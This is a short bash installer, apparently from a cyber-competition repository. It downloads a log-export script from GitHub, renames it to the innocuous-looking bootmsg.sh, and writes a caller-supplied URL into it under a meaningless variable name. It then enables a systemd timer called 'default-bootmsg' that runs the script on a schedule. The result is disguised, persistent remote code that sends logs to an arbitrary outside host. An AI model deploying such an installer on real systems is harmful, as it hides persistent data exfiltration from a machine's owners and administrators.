#!/bin/bash

URL="$1"
curl https://raw.githubusercontent.com/DannyGaev/LUC-CyberForce-2026/refs/heads/main/monitor_deployment/log-export-template.sh -o /usr/local/bin/bootmsg.sh
sed -i "5c\\nasjsuqgham=\"$URL\"" /usr/local/bin/bootmsg.sh
curl https://raw.githubusercontent.com/DannyGaev/LUC-CyberForce-2026/refs/heads/main/monitor_deployment/log-export-template.service -o /etc/systemd/system/default-bootmsg.service
curl https://raw.githubusercontent.com/DannyGaev/LUC-CyberForce-2026/refs/heads/main/monitor_deployment/log-export-template.timer -o /etc/systemd/system/default-bootmsg.timer
chmod 744 /usr/local/bin/bootmsg.sh
chmod 644 /etc/systemd/system/default-bootmsg.service
sleep 2
sudo systemctl daemon-reload
sudo systemctl enable --now default-bootmsg.timer